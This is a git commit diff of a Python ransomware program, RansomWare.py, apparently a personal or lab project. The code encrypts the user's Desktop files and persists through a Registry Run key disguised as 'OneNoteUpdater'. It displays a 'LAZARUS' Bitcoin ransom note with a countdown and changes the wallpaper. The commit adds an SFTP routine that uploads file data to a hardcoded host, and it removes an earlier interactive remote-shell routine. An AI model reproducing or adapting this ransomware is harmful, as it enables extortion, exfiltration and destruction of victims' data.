e4c13f9fab8e6a174fa9cfe47f7d9a4f107194fc
Bonz0Sbronz0 <davide.poli02@gmail.com>
2024-06-08 13:05:07 +0200

    sftp connection embedded inside ransom

--- RansomWare.py
+++ RansomWare.py
@@ -10,7 +10,7 @@ from tkinter import *
 import winreg
 import subprocess
 import psutil
-from threading import Thread
+from threading import Thread, Event
 from time import sleep
 import paramiko
 
@@ -24,57 +24,33 @@ class RansomWare:
         self.public_key = None
         self.sysRoot = os.path.expanduser('~')
         self.localRoot = os.path.join(self.sysRoot,'Desktop')
-        self.publicIP = requests.get('https://api.ipify.org').text
         self.crypted_files = []
-  
-    def create_ssh_key(self, ssh_path):
+        self.ip = '192.168.159.139'
+        self.write_complete_event = Event()
+        self.read_complete_event =Event()
+        self.log_path = f"{self.sysRoot}\\Documents\\log_file.txt"
+ 
+    def connection(self):
+        client = paramiko.SSHClient()    
+        known_hosts_path = os.path.expanduser('~/.ssh/known_hosts')
+        client.load_host_keys(known_hosts_path)
         try:
-            os.makedirs(ssh_path, exist_ok=True)
-            gen_key_comm = f'powershell ssh-keygen -q -t rsa -b 4096 -f {ssh_path}/id_rsa -N ransomware'
-            result = subprocess.run(gen_key_comm, capture_output=True, shell=True)
-            if result.returncode == 0:
-                return True
-            else:
-                print(f"Error creating SSH key: {result.stderr.decode()}")
-                return False
+            client.connect(self.ip, port=22, username='admin', password='admin')
+        except paramiko.SSHException as e:
+           return
+
+        try:
+            ftp_conn = client.open_sftp()
+            paths = self.read_log()
+            for path in paths:
+            # Il canale aperto non è strettamente necessario per l'upload SFTP, quindi può essere omesso.
+                ftp_conn.put(path,remotepath='local_file')
         except Exception as e:
-            print(f"Exception occurred while creating SSH key: {e}")
-            return False
+            return
+        finally:
+            ftp_conn.close()
+            client.close()
 
-    def connection_server(self):
-        ssh_path = os.path.join(os.environ['USERPROFILE'], '.ssh')
-        if not os.path.exists(f'{ssh_path}/id_rsa'):
-            is_created = self.create_ssh_key(ssh_path)
-            print(is_created)
-        else:
-            is_created = True
-        
-        if is_created:
-            is_connected = False
-            client = paramiko.SSHClient()
-
-            try:
-                key = paramiko.RSAKey.from_private_key_file(f'{ssh_path}\\id_rsa')
-                
-                #client.load_system_host_keys()
-                client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
-                
-                client.connect(hostname="192.168.159.139", port=22, username="nalid", key_filename=key)
-                channel = client.invoke_shell()
-
-                while(True):
-                    command = input("> ")
-                    channel.send(command + "\n")
-                    if command == exit:
-                        break
-                    while not channel.recv_ready():
-                        pass
-                    output = channel.recv(1024).decode('utf-8')
-                    print(output)
-            except Exception as e:
-                print(e)
-            finally:
-                client.close()
 
 
     def generate_key(self):
@@ -120,10 +96,22 @@ class RansomWare:
             self.crypted_files.append(new_path)
             return new_path
         
-    def write_log(self):
-        with open(f"{self.sysRoot}\\Documents\\log_file.txt", 'w') as f:
+    def write_log(self, file_path):
+        with open(self.log_path, 'w') as f:
             for file_path in self.crypted_files:
                 f.write(f"{file_path}\n")
+            #f.write('-1')
+        self.write_complete_event.set()
+    
+    def read_log(self):
+        paths = []
+        self.write_complete_event.wait()
+        with open(self.log_path, 'r') as f:
+            for line in f:
+                paths.append(line.strip())
+        self.read_complete_event.set()
+        return paths
+
                 
     def crypt_system(self, encrypted=False):
         system = os.walk(self.localRoot, topdown=True)
@@ -135,9 +123,9 @@ class RansomWare:
                 self.crypt_file(file_path, encrypted=encrypted)
         self.write_log()
 
-    def already_exists(self, key_path, key_name):
+    def already_exists(self, key_type, key_path, key_name):
         try:
-            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_READ)
+            key = winreg.OpenKey(key_type, key_path, 0, winreg.KEY_READ)
             winreg.QueryValueEx(key, key_name)
             winreg.CloseKey(key)
             return True
@@ -148,19 +136,17 @@ class RansomWare:
         pid = os.getpid()
         p = psutil.Process(pid)
         p.nice(psutil.HIGH_PRIORITY_CLASS)
-        handle = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, pid)
-        ctypes.windll.kernel32.SetPriorityClass(handle, 0x00000080)
-        ctypes.windll.kernel32.CloseHandle(handle)
 
     def add_to_startup(self, file_path, key_name="OneNoteUpdater"):
         key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
+        key_type = winreg.HKEY_CURRENT_USER
+        key = winreg.OpenKey(key_type, key_path, 0, winreg.KEY_SET_VALUE)
         path = os.path.expandvars(file_path)
         value = f'{path}\\RansomWare.exe'
-        if not self.already_exists(key_path, key_name):
+        if not self.already_exists(key_type, key_path, key_name):
             winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, value)
             winreg.CloseKey(key)
-
+    
     def change_desktop_background(self):
         imageUrl = 'https://external-content.duckduckgo.com/iu/?u=http%3A%2F%2Fgetwallpapers.com%2Fwallpaper%2Ffull%2F6%2F6%2Fc%2F266252.jpg&f=1&nofb=1&ipt=3f9154ef99c2da2759ffc5be46ba3698072b73b2bd6891ef1cbd7e5fa93eabb3&ipo=images'
         path = f'{self.sysRoot}\\AppData\\Local\\Temp\\72dks289d9dfd89wf.jpg'
@@ -169,6 +155,7 @@ class RansomWare:
         ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)
 
     def show_ransom_note(self):
+        self.change_desktop_background()
         root = Tk()
         root.title("OOOOOPS...PAY ATTENTION")
         root.geometry("700x500")
@@ -189,7 +176,7 @@ class RansomWare:
         root.geometry(f"+{x_Left}+{y_Top}")
 
         lb=Label(root,text="LAZARUS",font=("Segoe UI Black",24),bg="red",fg="white")
-        message_lb=Label(root,text="Your Files Are Be Encrypted, for Decrypt It\n Send 1000BTC in this Adress Before 21 Hours : \n ThDY834SVZGJfsdabsozv52lzssz084Bcsvz",font=("Segoe UI Black",15))
+        message_lb=Label(root,text="Your Files Are Be Encrypted, for Decrypt It\n Send 1000BTC in this Adress Before 24 Hours : \n ThDY834SVZGJfsdabsozv52lzssz084Bcsvz",font=("Segoe UI Black",15))
         compteur_label=Label(root,font=("Segoe UI Black",60))
 
 
@@ -220,21 +207,21 @@ class RansomWare:
         lb.grid(row=0,column=0,padx=240)
         message_lb.grid(row=1, column=0, pady=10, sticky="n")
         compteur_label.grid(row=2, column=0, pady=20, sticky="n" )
-        compteur("21:59:10")
+        compteur("24:00:00")
         root.mainloop()
+
 
 def main():
     rw = RansomWare()
     rw.generate_key()
+    rw.add_to_startup(rw.localRoot)
     rw.crypt_system()
     rw.encrypt_fernet_key()
-    rw.change_desktop_background()
-    rw.add_to_startup(rw.localRoot)
     rw.set_high_priority()
 
-    #t1 = Thread(target=rw.show_ransom_note)
-    t2 = Thread(target=rw.connection_server)
-    #t1.start()
+    t1 = Thread(target=rw.show_ransom_note())
+    t2 = Thread(target=rw.connection())
+    t1.start()
     t2.start()
 
 
